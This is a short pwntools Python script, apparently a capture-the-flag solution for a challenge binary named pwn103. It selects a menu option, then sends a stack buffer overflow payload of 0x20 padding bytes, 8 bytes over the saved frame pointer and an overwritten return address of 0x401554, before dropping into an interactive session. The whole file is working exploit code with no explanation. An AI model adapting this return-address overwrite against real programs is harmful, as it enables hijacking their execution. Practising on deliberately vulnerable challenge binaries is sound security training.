from pwn import * 
context.binary = binary = ELF('./pwn103.pwn103')
r = process('./pwn103.pwn103')

r.sendline('3')
payload = b'A'*0x20
payload += b'B'*0x8
payload += p32(0x00401554)
r.sendline(payload)
r.interactive()
